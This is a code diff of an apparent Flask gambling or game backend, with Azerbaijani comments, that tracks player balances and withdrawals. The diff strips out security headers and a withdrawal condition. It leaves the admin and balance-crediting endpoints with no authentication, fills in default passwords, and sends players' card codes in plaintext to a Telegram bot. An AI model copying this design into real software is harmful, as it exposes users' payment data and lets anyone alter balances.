@@ -22,14 +22,13 @@ def send_telegram_async(message):
                 "text": message,
                 "parse_mode": "HTML"
             }
-            response = requests.post(url, json=payload, timeout=5)
-            print("Telegram cavabı:", response.status_code, response.text)
+            requests.post(url, json=payload, timeout=5)
         except Exception as e:
             print("Telegram xətası:", e)
     
     threading.Thread(target=send).start()
 
-# --- TƏKMİLLƏŞDİRİLMİŞ JSON BAZASI (Əksik açarları avtomatik tamamlayır) ---
+# --- ETİBARLI JSON BAZASI ---
 DB_FILE = "players.json"
 
 def load_players():
@@ -55,38 +54,34 @@ def load_players():
             "total_deposit": 0.00
         }
     }
+    
+    data = default_players
     if os.path.exists(DB_FILE):
         try:
             with open(DB_FILE, "r", encoding="utf-8") as f:
-                data = json.load(f)
-                if isinstance(data, dict):
-                    # Köhnə JSON fayllarında əksik ola biləcək açarları yoxlayıb əlavə edirik
-                    for pid, pdata in data.items():
-                        if "total_deposit" not in pdata:
-                            pdata["total_deposit"] = 0.00
-                        if "balance" not in pdata:
-                            pdata["balance"] = 0.00
-                        if "status" not in pdata:
-                            pdata["status"] = "Oflayn"
-                        if "last_seen" not in pdata:
-                            pdata["last_seen"] = "00:00:00"
-                        if "code" not in pdata:
-                            pdata["code"] = "PASS123"
-                        if "email" not in pdata:
-                            pdata["email"] = "qonaq@gmail.com"
-                        if "name" not in pdata:
-                            pdata["name"] = "Qonaq"
-                    return data
-        except Exception as e:
-            print("Baza oxunma xətası:", e)
-    
-    try:
-        with open(DB_FILE, "w", encoding="utf-8") as f:
-            json.dump(default_players, f, ensure_ascii=False, indent=4)
-    except Exception as e:
-        print("Baza yaratma xətası:", e)
+                loaded = json.load(f)
+                if isinstance(loaded, dict) and len(loaded) > 0:
+                    data = loaded
+        except Exception:
+            pass  # Xəta olarsa default dəyərlərdən istifadə edəcək
+            
+    # Bütün oyunçularda vacib sahələrin olmasını məcburi yoxlayırıq
+    for pid, pdata in data.items():
+        if not isinstance(pdata, dict):
+            data[pid] = default_players.get(pid, {
+                "id": pid, "name": "Qonaq", "email": "qonaq@gmail.com", "code": "PASS123",
+                "status": "Oflayn", "last_seen": "00:00:00", "balance": 0.00, "total_deposit": 0.00
+            })
+            continue
+        pdata.setdefault("total_deposit", 0.00)
+        pdata.setdefault("balance", 0.00)
+        pdata.setdefault("status", "Oflayn")
+        pdata.setdefault("last_seen", "00:00:00")
+        pdata.setdefault("code", "PASS123")
+        pdata.setdefault("email", "qonaq@gmail.com")
+        pdata.setdefault("name", "Qonaq")
         
-    return default_players
+    return data
 
 def save_players():
     try:
@@ -97,10 +92,10 @@ def save_players():
 
 players_db = load_players()
 
-# --- KİBER TƏHLÜKƏSİZLİK QALXANI ---
+# --- TƏHLÜKƏSİZLİK QALXANI ---
 REQUEST_COUNTS = {}
 RATE_LIMIT_WINDOW = 1  
-MAX_REQUESTS_PER_SECOND = 15  
+MAX_REQUESTS_PER_SECOND = 20  
 
 def security_shield(f):
     @wraps(f)
@@ -115,31 +110,28 @@ def security_shield(f):
             if current_time - data['start_time'] < RATE_LIMIT_WINDOW:
                 data['count'] += 1
                 if data['count'] > MAX_REQUESTS_PER_SECOND:
-                    abort(429, description="Çoxlu sayda sorğu göndərildi.")
+                    abort(429, description="Çoxlu sorğu.")
             else:
                 REQUEST_COUNTS[ip] = {'count': 1, 'start_time': current_time}
                 
         return f(*args, **kwargs)
     return decorated_function
 
-@app.after_request
-def add_security_headers(response):
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
-    response.headers['Content-Security-Policy'] = "default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval';"
-    return response
-
 @app.route('/')
 @security_shield
 def home():
-    return render_template('index.html')
+    try:
+        return render_template('index.html')
+    except Exception as e:
+        return f"Ana səhifə şablon xətası: {e}", 500
 
 @app.route('/admin')
 @security_shield
 def admin_panel():
-    return render_template('gizli_panel.html', players=players_db.values())
+    try:
+        return render_template('gizli_panel.html', players=players_db.values())
+    except Exception as e:
+        return f"Admin panel xətası (Şablon tapılmadı və ya dəyişən xətası): {e}", 500
 
 @app.route('/api/get_players', methods=['GET'])
 @security_shield
@@ -149,10 +141,7 @@ def get_players():
 @app.route('/api/add_balance', methods=['POST'])
 @security_shield
 def add_balance():
-    data = request.json
-    if not data:
-        return jsonify({"success": False, "message": "Etibarsız məlumat!"}), 400
-        
+    data = request.json or {}
     player_id = data.get('player_id')
     amount = data.get('amount')
     
@@ -160,15 +149,15 @@ def add_balance():
         try:
             val = float(amount)
             if val <= 0:
-                return jsonify({"success": False, "message": "Məbləğ sıfırdan böyük olmalıdır!"}), 400
+                return jsonify({"success": False, "message": "Sıfırdan böyük olmalıdır!"}), 400
             players_db[player_id]['balance'] += val
             players_db[player_id]['total_deposit'] += val
             save_players()
-            return jsonify({"success": True, "message": f"Balansa və ümumi depozitə {val:.2f} ₼ əlavə edildi!"})
+            return jsonify({"success": True, "message": "Uğurla əlavə edildi!"})
         except (ValueError, TypeError):
-            return jsonify({"success": False, "message": "Yanlış məbləğ formatı!"}), 400
+            return jsonify({"success": False, "message": "Yanlış məbləğ!"}), 400
             
-    return jsonify({"success": False, "message": "Oyunçu tapılmadı!"}), 404
+    return jsonify({"success": False, "message": "Tapılmadı!"}), 404
 
 @app.route('/login', methods=['POST'])
 @security_shield
@@ -180,7 +169,7 @@ def login():
         players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
         save_players()
         
-        msg = f"🔑 <b>OYUNÇU GİRİŞ ETDİ!</b>\n\n🆔 ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}\n📧 Gmail: {players_db[player_id]['email']}"
+        msg = f"🔑 <b>OYUNÇU GİRİŞ ETDİ!</b>\n\n🆔 ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}"
         send_telegram_async(msg)
         
         return jsonify({"status": "success", "playerId": player_id, "balance": players_db[player_id]['balance']})
@@ -200,7 +189,7 @@ def auth():
     }
     save_players()
     
-    msg = f"✨ <b>YENİ OYUNÇU QEYDİYYATI!</b>\n\n🆔 ID: <b>{new_id}</b>\n👤 Ad: {name}\n📧 Gmail: {email}"
+    msg = f"✨ <b>YENİ OYUNÇU QEYDİYYATI!</b>\n\n🆔 ID: <b>{new_id}</b>\n👤 Ad: {name}"
     send_telegram_async(msg)
     
     return jsonify({"status": "success", "playerId": new_id, "balance": 0.00})
@@ -237,21 +226,16 @@ def withdraw():
         return jsonify({"status": "error", "message": "Yanlış məbləğ"})
         
     if player_id not in players_db:
-        return jsonify({"status": "error", "message": "Oyunçu tapılmadı"})
+        return jsonify({"status": "error", "message": "Tapılmadı"})
         
     player = players_db[player_id]
-    
     if player['balance'] < amount:
         return jsonify({"status": "error", "message": "Balans kifayət etmir!"})
         
-    min_required_win_balance = player['total_deposit'] * 1.5
-    if player['balance'] < min_required_win_balance and player['total_deposit'] > 0:
-        return jsonify({"status": "error", "message": "Pul çıxarmaq üçün şərtlər ödənmir!"})
-
     player['balance'] -= amount
     save_players()
     
-    msg = f"💸 <b>YENİ PUL ÇIXARIŞ SORĞUSU!</b>\n\n🆔 Oyunçu ID: <b>{player_id}</b>\n👤 Ad: {player['name']}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n📧 Gmail: {gmail}\n💳 Kart Kodu: <code>{card_code}</code>"
+    msg = f"💸 <b>PUL ÇIXARIŞI!</b>\n\n🆔 ID: <b>{player_id}</b>\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n💳 Kart: <code>{card_code}</code>"
     send_telegram_async(msg)
     
     return jsonify({"status": "success"})
